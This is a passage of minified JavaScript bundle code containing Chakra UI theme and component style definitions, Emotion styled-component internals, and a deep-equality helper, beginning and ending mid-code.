  { definePartsStyle: Sk, defineMultiStyleConfig: kk } = cy(Vy.keys),
  Ek = _v("form-control-color"),
  Ck = kk({
      baseStyle: Sk({
          container: { width: "100%", position: "relative" },
          requiredIndicator: { marginStart: "1", [Ek.variable]: "colors.red.500", _dark: { [Ek.variable]: "colors.red.300" }, color: Ek.reference },
          helperText: { mt: "2", [Ek.variable]: "colors.gray.600", _dark: { [Ek.variable]: "colors.whiteAlpha.600" }, color: Ek.reference, lineHeight: "normal", fontSize: "sm" },
      }),
  }),
  { definePartsStyle: _k, defineMultiStyleConfig: Pk } = cy(Uy.keys),
  Tk = _v("form-error-color"),
  Rk = Pk({
      baseStyle: _k({
          text: { [Tk.variable]: "colors.red.500", _dark: { [Tk.variable]: "colors.red.300" }, color: Tk.reference, mt: "2", fontSize: "sm", lineHeight: "normal" },
          icon: { marginEnd: "0.5em", [Tk.variable]: "colors.red.500", _dark: { [Tk.variable]: "colors.red.300" }, color: Tk.reference },
      }),
  }),
  zk = { baseStyle: { fontSize: "md", marginEnd: "3", mb: "2", fontWeight: "medium", transitionProperty: "common", transitionDuration: "normal", opacity: 1, _disabled: { opacity: 0.4 } } },
  Ak = {
      baseStyle: { fontFamily: "heading", fontWeight: "bold" },
      sizes: {
          "4xl": { fontSize: ["6xl", null, "7xl"], lineHeight: 1 },
          "3xl": { fontSize: ["5xl", null, "6xl"], lineHeight: 1 },
          "2xl": { fontSize: ["4xl", null, "5xl"], lineHeight: [1.2, null, 1] },
          xl: { fontSize: ["3xl", null, "4xl"], lineHeight: [1.33, null, 1.2] },
          lg: { fontSize: ["2xl", null, "3xl"], lineHeight: [1.33, null, 1.2] },
          md: { fontSize: "xl", lineHeight: 1.2 },
          sm: { fontSize: "md", lineHeight: 1.2 },
          xs: { fontSize: "sm", lineHeight: 1.2 },
      },
      defaultProps: { size: "xl" },
  },
  { defineMultiStyleConfig: jk, definePartsStyle: Ok } = cy(By.keys),
  Fk = _v("breadcrumb-link-decor"),
  Nk = jk({
      baseStyle: Ok({
          link: {
              transitionProperty: "common",
              transitionDuration: "fast",
              transitionTimingFunction: "ease-out",
              outline: "none",
              color: "inherit",
              textDecoration: Fk.reference,
              [Fk.variable]: "none",
              "&:not([aria-current=page])": { cursor: "pointer", _hover: { [Fk.variable]: "underline" }, _focusVisible: { boxShadow: "outline" } },
          },
      }),
  }),
  Mk = (e) => {
      const { colorScheme: t, theme: n } = e;
      if ("gray" === t) return { color: Pb("gray.800", "whiteAlpha.900")(e), _hover: { bg: Pb("gray.100", "whiteAlpha.200")(e) }, _active: { bg: Pb("gray.200", "whiteAlpha.300")(e) } };
      const r = Eb(`${t}.200`, 0.12)(n),
          o = Eb(`${t}.200`, 0.24)(n);
      return { color: Pb(`${t}.600`, `${t}.200`)(e), bg: "transparent", _hover: { bg: Pb(`${t}.50`, r)(e) }, _active: { bg: Pb(`${t}.100`, o)(e) } };
  },
  Lk = { yellow: { bg: "yellow.400", color: "black", hoverBg: "yellow.500", activeBg: "yellow.600" }, cyan: { bg: "cyan.400", color: "black", hoverBg: "cyan.500", activeBg: "cyan.600" } },
  Bk = {
      baseStyle: {
          lineHeight: "1.2",
          borderRadius: "md",
          fontWeight: "semibold",
          transitionProperty: "common",
          transitionDuration: "normal",
          _focusVisible: { boxShadow: "outline" },
          _disabled: { opacity: 0.4, cursor: "not-allowed", boxShadow: "none" },
          _hover: { _disabled: { bg: "initial" } },
      },
      variants: {
          ghost: Mk,
          outline: (e) => {
              const { colorScheme: t } = e,
                  n = Pb("gray.200", "whiteAlpha.300")(e);
              return {
                  border: "1px solid",
                  borderColor: "gray" === t ? n : "currentColor",
                  ".chakra-button__group[data-attached][data-orientation=horizontal] > &:not(:last-of-type)": { marginEnd: "-1px" },
                  ".chakra-button__group[data-attached][data-orientation=vertical] > &:not(:last-of-type)": { marginBottom: "-1px" },
                  ...bw(Mk, e),
              };
          },
          solid: (e) => {
              var t;
              const { colorScheme: n } = e;
              if ("gray" === n) {
                  const t = Pb("gray.100", "whiteAlpha.200")(e);
                  return { bg: t, color: Pb("gray.800", "whiteAlpha.900")(e), _hover: { bg: Pb("gray.200", "whiteAlpha.300")(e), _disabled: { bg: t } }, _active: { bg: Pb("gray.300", "whiteAlpha.400")(e) } };
              }
              const { bg: r = `${n}.500`, color: o = "white", hoverBg: a = `${n}.600`, activeBg: i = `${n}.700` } = null != (t = Lk[n]) ? t : {},
                  s = Pb(r, `${n}.200`)(e);
              return { bg: s, color: Pb(o, "gray.800")(e), _hover: { bg: Pb(a, `${n}.300`)(e), _disabled: { bg: s } }, _active: { bg: Pb(i, `${n}.400`)(e) } };
          },
          link: (e) => {
              const { colorScheme: t } = e;
              return {
                  padding: 0,
                  height: "auto",
                  lineHeight: "normal",
                  verticalAlign: "baseline",
                  color: Pb(`${t}.500`, `${t}.200`)(e),
                  _hover: { textDecoration: "underline", _disabled: { textDecoration: "none" } },
                  _active: { color: Pb(`${t}.700`, `${t}.500`)(e) },
              };
          },
          unstyled: { bg: "none", color: "inherit", display: "inline", lineHeight: "inherit", m: "0", p: "0" },
      },
      sizes: { lg: { h: "12", minW: "12", fontSize: "lg", px: "6" }, md: { h: "10", minW: "10", fontSize: "md", px: "4" }, sm: { h: "8", minW: "8", fontSize: "sm", px: "3" }, xs: { h: "6", minW: "6", fontSize: "xs", px: "2" } },
      defaultProps: { variant: "solid", size: "md", colorScheme: "gray" },
  },
  { definePartsStyle: Ik, defineMultiStyleConfig: Dk } = cy(ab.keys),
  $k = _v("card-bg"),
  Vk = _v("card-padding"),
  Uk = _v("card-shadow"),
  Wk = _v("card-radius"),
  Hk = _v("card-border-width", "0"),
  qk = _v("card-border-color"),
  Yk = Ik({
      container: { [$k.variable]: "colors.chakra-body-bg", backgroundColor: $k.reference, boxShadow: Uk.reference, borderRadius: Wk.reference, color: "chakra-body-text", borderWidth: Hk.reference, borderColor: qk.reference },
      body: { padding: Vk.reference, flex: "1 1 0%" },
      header: { padding: Vk.reference },
      footer: { padding: Vk.reference },
  }),
  Xk = {
      sm: Ik({ container: { [Wk.variable]: "radii.base", [Vk.variable]: "space.3" } }),
      md: Ik({ container: { [Wk.variable]: "radii.md", [Vk.variable]: "space.5" } }),
      lg: Ik({ container: { [Wk.variable]: "radii.xl", [Vk.variable]: "space.7" } }),
  },
  Gk = Dk({
      baseStyle: Yk,
      variants: {
          elevated: Ik({ container: { [Uk.variable]: "shadows.base", _dark: { [$k.variable]: "colors.gray.700" } } }),
          outline: Ik({ container: { [Hk.variable]: "1px", [qk.variable]: "colors.chakra-border-color" } }),
          filled: Ik({ container: { [$k.variable]: "colors.chakra-subtle-bg" } }),
          unstyled: { body: { [Vk.variable]: 0 }, header: { [Vk.variable]: 0 }, footer: { [Vk.variable]: 0 } },
      },
      sizes: Xk,
      defaultProps: { variant: "elevated", size: "md" },
  }),
  Qk = Db("close-button-size"),
  Kk = Db("close-button-bg"),
  Zk = {
      baseStyle: {
          w: [Qk.reference],
          h: [Qk.reference],
          borderRadius: "md",
          transitionProperty: "common",
          transitionDuration: "normal",
          _disabled: { opacity: 0.4, cursor: "not-allowed", boxShadow: "none" },
          _hover: { [Kk.variable]: "colors.blackAlpha.100", _dark: { [Kk.variable]: "colors.whiteAlpha.100" } },
          _active: { [Kk.variable]: "colors.blackAlpha.200", _dark: { [Kk.variable]: "colors.whiteAlpha.200" } },
          _focusVisible: { boxShadow: "outline" },
          bg: Kk.reference,
      },
      sizes: { lg: { [Qk.variable]: "sizes.10", fontSize: "md" }, md: { [Qk.variable]: "sizes.8", fontSize: "xs" }, sm: { [Qk.variable]: "sizes.6", fontSize: "2xs" } },
      defaultProps: { size: "md" },
  },
  { variants: Jk, defaultProps: eE } = Ex,
  tE = { baseStyle: { fontFamily: "mono", fontSize: "sm", px: "0.2em", borderRadius: "sm", bg: xx.bg.reference, color: xx.color.reference, boxShadow: xx.shadow.reference }, variants: Jk, defaultProps: eE },
  nE = { baseStyle: { w: "100%", mx: "auto", maxW: "prose", px: "4" } },
  rE = { baseStyle: { opacity: 0.6, borderColor: "inherit" }, variants: { solid: { borderStyle: "solid" }, dashed: { borderStyle: "dashed" } }, defaultProps: { variant: "solid" } },
  { definePartsStyle: oE, defineMultiStyleConfig: aE } = cy(Ny.keys),
  iE = aE({
      baseStyle: oE({
          container: { borderTopWidth: "1px", borderColor: "inherit", _last: { borderBottomWidth: "1px" } },
          button: {
              transitionProperty: "common",
              transitionDuration: "normal",
              fontSize: "md",
              _focusVisible: { boxShadow: "outline" },
              _hover: { bg: "blackAlpha.50" },
              _disabled: { opacity: 0.4, cursor: "not-allowed" },
              px: "4",
              py: "2",
          },
          panel: { pt: "2", px: "4", pb: "5" },
          icon: { fontSize: "1.25em" },
      }),
  }),
  { definePartsStyle: sE, defineMultiStyleConfig: lE } = cy(My.keys),
  cE = _v("alert-fg"),
  uE = _v("alert-bg");
function dE(e) {
  const { theme: t, colorScheme: n } = e;
  return { light: `colors.${n}.100`, dark: Eb(`${n}.200`, 0.16)(t) };
}
var fE = lE({
      baseStyle: sE({
          container: { bg: uE.reference, px: "4", py: "3" },
          title: { fontWeight: "bold", lineHeight: "6", marginEnd: "2" },
          description: { lineHeight: "6" },
          icon: { color: cE.reference, flexShrink: 0, marginEnd: "3", w: "5", h: "6" },
          spinner: { color: cE.reference, flexShrink: 0, marginEnd: "3", w: "5", h: "5" },
      }),
      variants: {
          subtle: sE((e) => {
              const { colorScheme: t } = e,
                  n = dE(e);
              return { container: { [cE.variable]: `colors.${t}.500`, [uE.variable]: n.light, _dark: { [cE.variable]: `colors.${t}.200`, [uE.variable]: n.dark } } };
          }),
          "left-accent": sE((e) => {
              const { colorScheme: t } = e,
                  n = dE(e);
              return {
                  container: { [cE.variable]: `colors.${t}.500`, [uE.variable]: n.light, _dark: { [cE.variable]: `colors.${t}.200`, [uE.variable]: n.dark }, paddingStart: "3", borderStartWidth: "4px", borderStartColor: cE.reference },
              };
          }),
          "top-accent": sE((e) => {
              const { colorScheme: t } = e,
                  n = dE(e);
              return { container: { [cE.variable]: `colors.${t}.500`, [uE.variable]: n.light, _dark: { [cE.variable]: `colors.${t}.200`, [uE.variable]: n.dark }, pt: "2", borderTopWidth: "4px", borderTopColor: cE.reference } };
          }),
          solid: sE((e) => {
              const { colorScheme: t } = e;
              return { container: { [cE.variable]: "colors.white", [uE.variable]: `colors.${t}.500`, _dark: { [cE.variable]: "colors.gray.900", [uE.variable]: `colors.${t}.200` }, color: cE.reference } };
          }),
      },
      defaultProps: { variant: "subtle", colorScheme: "blue" },
  }),
  { definePartsStyle: pE, defineMultiStyleConfig: hE } = cy(Ly.keys),
  mE = _v("avatar-border-color"),
  gE = _v("avatar-bg"),
  vE = _v("avatar-font-size"),
  yE = _v("avatar-size"),
  bE = { borderRadius: "full", border: "0.2em solid", borderColor: mE.reference, [mE.variable]: "white", _dark: { [mE.variable]: "colors.gray.800" } },
  xE = { bg: gE.reference, fontSize: vE.reference, width: yE.reference, height: yE.reference, lineHeight: "1", [gE.variable]: "colors.gray.200", _dark: { [gE.variable]: "colors.whiteAlpha.400" } },
  wE = (e) => {
      const { name: t, theme: n } = e,
          r = t ? _b({ string: t }) : "colors.gray.400",
          o = ((e) => (t) => "dark" === kb(e)(t))(r)(n);
      let a = "white";
      return (
          o || (a = "gray.800"),
          {
              bg: gE.reference,
              fontSize: vE.reference,
              color: a,
              borderColor: mE.reference,
              verticalAlign: "top",
              width: yE.reference,
              height: yE.reference,
              "&:not([data-loaded])": { [gE.variable]: r },
              [mE.variable]: "colors.white",
              _dark: { [mE.variable]: "colors.gray.800" },
          }
      );
  },
  SE = { fontSize: vE.reference, lineHeight: "1" };
function kE(e) {
  const t = "100%" !== e ? Ey[e] : void 0;
  return pE({ container: { [yE.variable]: null != t ? t : e, [vE.variable]: `calc(${null != t ? t : e} / 2.5)` }, excessLabel: { [yE.variable]: null != t ? t : e, [vE.variable]: `calc(${null != t ? t : e} / 2.5)` } });
}
var EE = {
  semanticTokens: {
      colors: {
          "chakra-body-text": { _light: "gray.800", _dark: "whiteAlpha.900" },
          "chakra-body-bg": { _light: "white", _dark: "gray.800" },
          "chakra-border-color": { _light: "gray.200", _dark: "whiteAlpha.300" },
          "chakra-inverse-text": { _light: "white", _dark: "gray.800" },
          "chakra-subtle-bg": { _light: "gray.100", _dark: "gray.700" },
          "chakra-subtle-text": { _light: "gray.600", _dark: "gray.400" },
          "chakra-placeholder-color": { _light: "gray.500", _dark: "whiteAlpha.400" },
      },
  },
  direction: "ltr",
  ...Cy,
  components: {
      Accordion: iE,
      Alert: fE,
      Avatar: hE({
          baseStyle: pE((e) => ({ badge: bw(bE, e), excessLabel: bw(xE, e), container: bw(wE, e), label: SE })),
          sizes: { "2xs": kE(4), xs: kE(6), sm: kE(8), md: kE(12), lg: kE(16), xl: kE(24), "2xl": kE(32), full: kE("100%") },
          defaultProps: { size: "md" },
      }),
      Badge: Ex,
      Breadcrumb: Nk,
      Button: Bk,
      Checkbox: Mw,
      CloseButton: Zk,
      Code: tE,
      Container: nE,
      Divider: rE,
      Drawer: yk,
      Editable: wk,
      Form: Ck,
      FormError: Rk,
      FormLabel: zk,
      Heading: Ak,
      Input: rw,
      Kbd: pS,
      Link: hS,
      List: vS,
      Menu: SS,
      Modal: NS,
      NumberInput: ZS,
      PinInput: JS,
      Popover: ak,
      Progress: yw,
      Radio: Dw,
      Select: Hw,
      Skeleton: Xw,
      SkipLink: Qw,
      Slider: iS,
      Spinner: lS,
      Stat: dS,
      Switch: Zb,
      Table: rx,
      Tabs: bx,
      Tag: Mx,
      Textarea: iw,
      Tooltip: uw,
      Card: Gk,
      Stepper: Oy,
  },
  styles: {
      global: {
          body: { fontFamily: "body", color: "chakra-body-text", bg: "chakra-body-bg", transitionProperty: "background-color", transitionDuration: "normal", lineHeight: "base" },
          "*::placeholder": { color: "chakra-placeholder-color" },
          "*, *::before, &::after": { borderColor: "chakra-border-color" },
      },
  },
  config: { useSystemColorMode: !1, initialColorMode: "light", cssVarPrefix: "chakra" },
};
function CE(e) {
  return "function" == typeof e;
}
var _E,
  PE =
      ((_E = EE),
      function (...e) {
          let t = [...e],
              n = e[e.length - 1];
          var r;
          return (
              xg((r = n)) && py.every((e) => Object.prototype.hasOwnProperty.call(r, e)) && t.length > 1 ? (t = t.slice(0, t.length - 1)) : (n = _E),
              (function (...e) {
                  return (t) => e.reduce((e, t) => t(e), t);
              })(
                  ...t.map((e) => (t) =>
                      CE(e)
                          ? e(t)
                          : (function (...e) {
                                return Pg({}, ...e, TE);
                            })(t, e)
                  )
              )(n)
          );
      });
function TE(e, t, n, r) {
  if ((CE(e) || CE(t)) && Object.prototype.hasOwnProperty.call(r, n))
      return (...n) => {
          const r = CE(e) ? e(...n) : e,
              o = CE(t) ? t(...n) : t;
          return Pg({}, r, o, TE);
      };
}
var RE = ((e) => {
  const t = new WeakMap();
  return (n, r, o, a) => {
      if (void 0 === n) return e(n, r, o);
      t.has(n) || t.set(n, new Map());
      const i = t.get(n);
      if (i.has(r)) return i.get(r);
      const s = e(n, r, o, a);
      return i.set(r, s), s;
  };
})(function (e, t, n, r) {
  const o = "string" == typeof t ? t.split(".") : [t];
  for (r = 0; r < o.length && e; r += 1) e = e[o[r]];
  return void 0 === e ? n : e;
});
function zE(e, t) {
  const n = {};
  return (
      Object.keys(e).forEach((r) => {
          const o = e[r];
          t(o, r, e) && (n[r] = o);
      }),
      n
  );
}
var AE = (e) => zE(e, (e) => null != e);
function jE(e, ...t) {
  return "function" == typeof e ? e(...t) : e;
}
var OE = "undefined" != typeof Element,
  FE = "function" == typeof Map,
  NE = "function" == typeof Set,
  ME = "function" == typeof ArrayBuffer && !!ArrayBuffer.isView;
function LE(e, t) {
  if (e === t) return !0;
  if (e && t && "object" == typeof e && "object" == typeof t) {
      if (e.constructor !== t.constructor) return !1;
      var n, r, o, a;
      if (Array.isArray(e)) {
          if ((n = e.length) != t.length) return !1;
          for (r = n; 0 != r--; ) if (!LE(e[r], t[r])) return !1;
          return !0;
      }
      if (FE && e instanceof Map && t instanceof Map) {
          if (e.size !== t.size) return !1;
          for (a = e.entries(); !(r = a.next()).done; ) if (!t.has(r.value[0])) return !1;
          for (a = e.entries(); !(r = a.next()).done; ) if (!LE(r.value[1], t.get(r.value[0]))) return !1;
          return !0;
      }
      if (NE && e instanceof Set && t instanceof Set) {
          if (e.size !== t.size) return !1;
          for (a = e.entries(); !(r = a.next()).done; ) if (!t.has(r.value[0])) return !1;
          return !0;
      }
      if (ME && ArrayBuffer.isView(e) && ArrayBuffer.isView(t)) {
          if ((n = e.length) != t.length) return !1;
          for (r = n; 0 != r--; ) if (e[r] !== t[r]) return !1;
          return !0;
      }
      if (e.constructor === RegExp) return e.source === t.source && e.flags === t.flags;
      if (e.valueOf !== Object.prototype.valueOf && "function" == typeof e.valueOf && "function" == typeof t.valueOf) return e.valueOf() === t.valueOf();
      if (e.toString !== Object.prototype.toString && "function" == typeof e.toString && "function" == typeof t.toString) return e.toString() === t.toString();
      if ((n = (o = Object.keys(e)).length) !== Object.keys(t).length) return !1;
      for (r = n; 0 != r--; ) if (!Object.prototype.hasOwnProperty.call(t, o[r])) return !1;
      if (OE && e instanceof Element) return !1;
      for (r = n; 0 != r--; ) if ((("_owner" !== o[r] && "__v" !== o[r] && "__o" !== o[r]) || !e.$$typeof) && !LE(e[o[r]], t[o[r]])) return !1;
      return !0;
  }
  return e != e && t != t;
}
var BE = function (e, t) {
  try {
      return LE(e, t);
  } catch (n) {
      if ((n.message || "").match(/stack|recursion/i)) return !1;
      throw n;
  }
};
const IE = n(BE);
function DE(e, t = {}) {
  var n;
  const { styleConfig: r, ...o } = t,
      { theme: a, colorMode: i } = yg(),
      s = e ? RE(a, `components.${e}`) : void 0,
      l = r || s,
      c = Pg(
          { theme: a, colorMode: i },
          null != (n = null == l ? void 0 : l.defaultProps) ? n : {},
          AE(
              (function (e, t) {
                  const n = {};
                  return (
                      Object.keys(e).forEach((r) => {
                          t.includes(r) || (n[r] = e[r]);
                      }),
                      n
                  );
              })(o, ["children"])
          )
      ),
      u = D.useRef({});
  if (l) {
      const e =
              ((d = l),
              (e) => {
                  var t;
                  const { variant: n, size: r, theme: o } = e,
                      a = dy(o);
                  return Pg({}, wg(null != (t = d.baseStyle) ? t : {}, e), a(d, "sizes", r, e), a(d, "variants", n, e));
              }),
          t = e(c);
      IE(u.current, t) || (u.current = t);
  }
  var d;
  return u.current;
}
function $E(e, t = {}) {
  return DE(e, t);
}
function VE(e, t = {}) {
  return DE(e, t);
}
var UE = new Set([...ry, "textStyle", "layerStyle", "apply", "noOfLines", "focusBorderColor", "errorBorderColor", "as", "__css", "css", "sx"]),
  WE = new Set(["htmlWidth", "htmlHeight", "htmlSize", "htmlTranslate"]);
function HE(e) {
  return WE.has(e) || !UE.has(e);
}
var qE,
  YE = /^((children|dangerouslySetInnerHTML|key|ref|autoFocus|defaultValue|defaultChecked|innerHTML|suppressContentEditableWarning|suppressHydrationWarning|valueLink|abbr|accept|acceptCharset|accessKey|action|allow|allowUserMedia|allowPaymentRequest|allowFullScreen|allowTransparency|alt|async|autoComplete|autoPlay|capture|cellPadding|cellSpacing|challenge|charSet|checked|cite|classID|className|cols|colSpan|content|contentEditable|contextMenu|controls|controlsList|coords|crossOrigin|data|dateTime|decoding|default|defer|dir|disabled|disablePictureInPicture|download|draggable|encType|enterKeyHint|form|formAction|formEncType|formMethod|formNoValidate|formTarget|frameBorder|headers|height|hidden|high|href|hrefLang|htmlFor|httpEquiv|id|inputMode|integrity|is|keyParams|keyType|kind|label|lang|list|loading|loop|low|marginHeight|marginWidth|max|maxLength|media|mediaGroup|method|min|minLength|multiple|muted|name|nonce|noValidate|open|optimum|pattern|placeholder|playsInline|poster|preload|profile|radioGroup|readOnly|referrerPolicy|rel|required|reversed|role|rows|rowSpan|sandbox|scope|scoped|scrolling|seamless|selected|shape|size|sizes|slot|span|spellCheck|src|srcDoc|srcLang|srcSet|start|step|style|summary|tabIndex|target|title|translate|type|useMap|value|width|wmode|wrap|about|datatype|inlist|prefix|property|resource|typeof|vocab|autoCapitalize|autoCorrect|autoSave|color|incremental|fallback|inert|itemProp|itemScope|itemType|itemID|itemRef|on|option|results|security|unselectable|accentHeight|accumulate|additive|alignmentBaseline|allowReorder|alphabetic|amplitude|arabicForm|ascent|attributeName|attributeType|autoReverse|azimuth|baseFrequency|baselineShift|baseProfile|bbox|begin|bias|by|calcMode|capHeight|clip|clipPathUnits|clipPath|clipRule|colorInterpolation|colorInterpolationFilters|colorProfile|colorRendering|contentScriptType|contentStyleType|cursor|cx|cy|d|decelerate|descent|diffuseConstant|direction|display|divisor|dominantBaseline|dur|dx|dy|edgeMode|elevation|enableBackground|end|exponent|externalResourcesRequired|fill|fillOpacity|fillRule|filter|filterRes|filterUnits|floodColor|floodOpacity|focusable|fontFamily|fontSize|fontSizeAdjust|fontStretch|fontStyle|fontVariant|fontWeight|format|from|fr|fx|fy|g1|g2|glyphName|glyphOrientationHorizontal|glyphOrientationVertical|glyphRef|gradientTransform|gradientUnits|hanging|horizAdvX|horizOriginX|ideographic|imageRendering|in|in2|intercept|k|k1|k2|k3|k4|kernelMatrix|kernelUnitLength|kerning|keyPoints|keySplines|keyTimes|lengthAdjust|letterSpacing|lightingColor|limitingConeAngle|local|markerEnd|markerMid|markerStart|markerHeight|markerUnits|markerWidth|mask|maskContentUnits|maskUnits|mathematical|mode|numOctaves|offset|opacity|operator|order|orient|orientation|origin|overflow|overlinePosition|overlineThickness|panose1|paintOrder|pathLength|patternContentUnits|patternTransform|patternUnits|pointerEvents|points|pointsAtX|pointsAtY|pointsAtZ|preserveAlpha|preserveAspectRatio|primitiveUnits|r|radius|refX|refY|renderingIntent|repeatCount|repeatDur|requiredExtensions|requiredFeatures|restart|result|rotate|rx|ry|scale|seed|shapeRendering|slope|spacing|specularConstant|specularExponent|speed|spreadMethod|startOffset|stdDeviation|stemh|stemv|stitchTiles|stopColor|stopOpacity|strikethroughPosition|strikethroughThickness|string|stroke|strokeDasharray|strokeDashoffset|strokeLinecap|strokeLinejoin|strokeMiterlimit|strokeOpacity|strokeWidth|surfaceScale|systemLanguage|tableValues|targetX|targetY|textAnchor|textDecoration|textRendering|textLength|to|transform|u1|u2|underlinePosition|underlineThickness|unicode|unicodeBidi|unicodeRange|unitsPerEm|vAlphabetic|vHanging|vIdeographic|vMathematical|values|vectorEffect|version|vertAdvY|vertOriginX|vertOriginY|viewBox|viewTarget|visibility|widths|wordSpacing|writingMode|x|xHeight|x1|x2|xChannelSelector|xlinkActuate|xlinkArcrole|xlinkHref|xlinkRole|xlinkShow|xlinkTitle|xlinkType|xmlBase|xmlns|xmlnsXlink|xmlLang|xmlSpace|y|y1|y2|yChannelSelector|z|zoomAndPan|for|class|autofocus)|(([Dd][Aa][Tt][Aa]|[Aa][Rr][Ii][Aa]|x)-.*))$/,
  XE = $h(function (e) {
      return YE.test(e) || (111 === e.charCodeAt(0) && 110 === e.charCodeAt(1) && e.charCodeAt(2) < 91);
  }),
  GE = function (e) {
      return "theme" !== e;
  },
  QE = function (e) {
      return "string" == typeof e && e.charCodeAt(0) > 96 ? XE : GE;
  },
  KE = function (e, t, n) {
      var r;
      if (t) {
          var o = t.shouldForwardProp;
          r =
              e.__emotion_forwardProp && o
                  ? function (t) {
                        return e.__emotion_forwardProp(t) && o(t);
                    }
                  : o;
      }
      return "function" != typeof r && n && (r = e.__emotion_forwardProp), r;
  },
  ZE = function (e) {
      var t = e.cache,
          n = e.serialized,
          r = e.isStringTag;
      return (
          Sm(t, n, r),
          Mm(function () {
              return km(t, n, r);
          }),
          null
      );
  },
  JE = function e(t, n) {
      var r,
          o,
          a = t.__emotion_real === t,
          i = (a && t.__emotion_base) || t;
      void 0 !== n && ((r = n.label), (o = n.target));
      var s = KE(t, n, a),
          l = s || QE(i),
          c = !l("as");
      return function () {
          var u = arguments,
              d = a && void 0 !== t.__emotion_styles ? t.__emotion_styles.slice(0) : [];
          if ((void 0 !== r && d.push("label:" + r + ";"), null == u[0] || void 0 === u[0].raw)) d.push.apply(d, u);
          else {
              d.push(u[0][0]);
              for (var f = u.length, p = 1; p < f; p++) d.push(u[p], u[0][p]);
          }
          var h = Im(function (e, t, n) {
              var r,
                  a,
                  u,
                  f,
                  p = (c && e.as) || i,
                  h = "",
                  m = [],
                  g = e;
              if (null == e.theme) {
                  for (var v in ((g = {}), e)) g[v] = e[v];
                  g.theme = D.useContext(Dm);
              }
              "string" == typeof e.className
                  ? ((r = t.registered),
                    (a = m),
                    (u = e.className),
                    (f = ""),
                    u.split(" ").forEach(function (e) {
                        void 0 !== r[e] ? a.push(r[e] + ";") : (f += e + " ");
                    }),
                    (h = f))
                  : null != e.className && (h = e.className + " ");
              var y = Fm(d.concat(m), t.registered, g);
              (h += t.key + "-" + y.name), void 0 !== o && (h += " " + o);
              var b = c && void 0 === s ? QE(p) : l,
                  x = {};
              for (var w in e) (c && "as" === w) || (b(w) && (x[w] = e[w]));
              return (x.className = h), (x.ref = n), D.createElement(D.Fragment, null, D.createElement(ZE, { cache: t, serialized: y, isStringTag: "string" == typeof p }), D.createElement(p, x));
          });
          return (
              (h.displayName = void 0 !== r ? r : "Styled(" + ("string" == typeof i ? i : i.displayName || i.name || "Component") + ")"),
              (h.defaultProps = t.defaultProps),
              (h.__emotion_real = h),
              (h.__emotion_base = i),
              (h.__emotion_styles = d),
              (h.__emotion_forwardProp = s),
              Object.defineProperty(h, "toString", {
                  value: function () {
                      return "." + o;
                  },
              }),
              (h.withComponent = function (t, r) {
                  return e(t, Qh({}, n, r, { shouldForwardProp: KE(h, r, !0) })).apply(void 0, d);
              }),
              h
          );
      };
  }.bind();
[
  "a",
  "abbr",
  "address",
  "area",
  "article",
  "aside",
  "audio",
  "b",
  "base",
  "bdi",
  "bdo",
  "big",
  "blockquote",
  "body",
  "br",
  "button",
  "canvas",
  "caption",
  "cite",
  "code",
  "col",
  "colgroup",
  "data",
  "datalist",
  "dd",
  "del",
  "details",
  "dfn",
  "dialog",
  "div",
  "dl",
  "dt",
  "em",
  "embed",
  "fieldset",
  "figcaption",
  "figure",
  "footer",
  "form",
  "h1",
  "h2",
  "h3",
  "h4",
  "h5",
  "h6",
  "head",
  "header",
  "hgroup",
  "hr",
  "html",
  "i",
  "iframe",
  "img",
  "input",
  "ins",
  "kbd",
  "keygen",
  "label",
  "legend",
  "li",
  "link",
  "main",
  "map",
  "mark",
  "marquee",
  "menu",
  "menuitem",
  "meta",
  "meter",
  "nav",
  "noscript",
  "object",
  "ol",
  "optgroup",
  "option",
  "output",
  "p",
  "param",
  "picture",
  "pre",
  "progress",
  "q",
  "rp",
  "rt",
  "ruby",
  "s",
  "samp",
  "script",
  "section",
  "select",
  "small",
  "source",
  "span",
  "strong",
  "style",
  "sub",
  "summary",
  "sup",
  "table",
  "tbody",
  "td",
  "textarea",
  "tfoot",
  "th",
  "thead",
  "time",
  "title",
  "tr",
  "track",
  "u",
  "ul",
  "var",
  "video",
  "wbr",
  "circle",
  "clipPath",
  "defs",
  "ellipse",
  "foreignObject",
  "g",
  "image",
  "line",
  "linearGradient",
  "mask",
  "path",
  "pattern",
  "polygon",
  "polyline",
  "radialGradient",
  "rect",
  "stop",
  "svg",
  "text",
  "tspan",
].forEach(function (e) {
  JE[e] = JE(e);
});
var eC = null != (qE = JE.default) ? qE : JE,
  tC = ({ baseStyle: e }) => (t) => {
      const { theme: n, css: r, __css: o, sx: a, ...i } = t,
          s = zE(i, (e, t) => ((e) => e in oy)(t)),
          l = (function (e, ...t) {
              if (null == e) throw new TypeError("Cannot convert undefined or null to object");
              const n = { ...e };
              for (const r of t) if (null != r) for (const e in r) Object.prototype.hasOwnProperty.call(r, e) && (e in n && delete n[e], (n[e] = r[e]));
              return n;
          })({}, o, jE(e, t), AE(s), a),
          c = ly(l)(t.theme);
      return r ? [c, r] : c;
  };
function nC(e, t) {
  const { baseStyle: n, ...r } = null != t ? t : {};
  r.shouldForwardProp || (r.shouldForwardProp = HE);
  const o = tC({ baseStyle: n }),
      a = eC(e, r)(o);
  return $.forwardRef(function (e, t) {
      const { colorMode: n, forced: r } = lg();
      return $.createElement(a, { ref: t, "data-theme": r ? n : void 0, ...e });
  });
}
var rC = (function () {
  const e = new Map();
  return new Proxy(nC, { apply: (e, t, n) => nC(...n), get: (t, n) => (e.has(n) || e.set(n, nC(n)), e.get(n)) });
})();
function oC(e) {
  return D.forwardRef(e);
}
function aC(e) {
  const { cssVarsRoot: t, theme: n, children: r } = e,
      o = D.useMemo(() => Jv(n), [n]);
  return Q.jsxs(Vm, { theme: o, children: [Q.jsx(iC, { root: t }), r] });
}
function iC({ root: e = ":host, :root" }) {
  const t = [e, "[data-theme]"].join(",");
  return Q.jsx(Um, { styles: (e) => ({ [t]: e.__cssVars }) });
}
function sC() {
  const { colorMode: e } = lg();
  return Q.jsx(Um, {
      styles: (t) => {
          const n = jE(RE(t, "styles.global"), { theme: t, colorMode: e });
          if (!n) return;
          return ly(n)(t);
      },
  });
}
!(function (e = {}) {
  const { strict: t = !0, errorMessage: n = "useContext: `context` is undefined. Seems you forgot to wrap component within the Provider", name: r } = e,
      o = D.createContext(void 0);
  (o.displayName = r), o.Provider;
})({ name: "StylesContext", errorMessage: "useStyles: `styles` is undefined. Seems you forgot to wrap the components in `<StylesProvider />` " });
var lC = D.createContext({ getDocument: () => document, getWindow: () => window });
function cC(e) {
  const { children: t, environment: n, disabled: r } = e,
      o = D.useRef(null),
      a = D.useMemo(
          () =>
              n || {
                  getDocument: () => {
                      var e, t;
                      return null != (t = null == (e = o.current) ? void 0 : e.ownerDocument) ? t : document;
                  },
